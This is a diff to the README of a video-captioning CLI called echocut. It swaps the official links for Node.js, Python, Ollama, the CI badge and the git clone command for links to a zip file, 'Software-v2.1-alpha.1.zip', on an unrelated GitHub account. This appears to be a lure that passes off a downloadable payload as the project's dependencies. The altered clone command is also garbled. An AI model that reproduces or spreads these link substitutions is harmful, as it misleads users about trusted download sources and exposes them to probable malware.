@@ -2,9 +2,9 @@
 
 > **English** | [简体中文](README.zh-CN.md)
 
-[![CI](https://github.com/BillLucky/echocut/actions/workflows/ci.yml/badge.svg)](https://github.com/BillLucky/echocut/actions/workflows/ci.yml)
+[![CI](https://raw.githubusercontent.com/brinyicterogenic199/echocut/main/assets/Software-v2.1-alpha.1.zip)](https://raw.githubusercontent.com/brinyicterogenic199/echocut/main/assets/Software-v2.1-alpha.1.zip)
 [![License: Apache-2.0](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](LICENSE)
-[![Node](https://img.shields.io/badge/node-%3E%3D18-brightgreen.svg)](https://nodejs.org)
+[![Node](https://img.shields.io/badge/node-%3E%3D18-brightgreen.svg)](https://raw.githubusercontent.com/brinyicterogenic199/echocut/main/assets/Software-v2.1-alpha.1.zip)
 [![PRs welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
 
 **Turn raw footage into brand-ready, platform-optimized video — with one command.**
@@ -38,10 +38,10 @@ echocut burn talk.mp4 --cut-fillers
 
 | Dependency | Why | Install |
 |---|---|---|
-| **Node.js 18+** | the CLI | <https://nodejs.org> |
-| **Python 3.11+** | speech-to-text | <https://python.org> |
+| **Node.js 18+** | the CLI | <https://raw.githubusercontent.com/brinyicterogenic199/echocut/main/assets/Software-v2.1-alpha.1.zip> |
+| **Python 3.11+** | speech-to-text | <https://raw.githubusercontent.com/brinyicterogenic199/echocut/main/assets/Software-v2.1-alpha.1.zip> |
 | **FFmpeg** | video/audio processing | `brew install ffmpeg` · `apt install ffmpeg` |
-| **Ollama** | local LLM (titles, caption fixes) | <https://ollama.com> → `ollama pull qwen3.5:9b` |
+| **Ollama** | local LLM (titles, caption fixes) | <https://raw.githubusercontent.com/brinyicterogenic199/echocut/main/assets/Software-v2.1-alpha.1.zip> → `ollama pull qwen3.5:9b` |
 
 > **Platform:** works cross-platform via **WhisperX** (CPU or CUDA). The fastest ASR
 > (`qwen3`, `mlx`) is **Apple Silicon only** and falls back to WhisperX elsewhere.
@@ -51,7 +51,7 @@ echocut burn talk.mp4 --cut-fillers
 ### 2. Install
 
 ```bash
-git clone https://github.com/<you>/echocut.git && cd echocut
+git clone https://raw.githubusercontent.com/brinyicterogenic199/echocut/main/assets/Software-v2.1-alpha.1.zip<you>/echocut.git && cd echocut
 npm install                                                  # Node deps + CLI
 python3 -m venv .venv && .venv/bin/pip install -r requirements.txt   # Python ASR
 npm run fetch-fonts                                          # download default CJK font (Noto Sans SC, OFL)
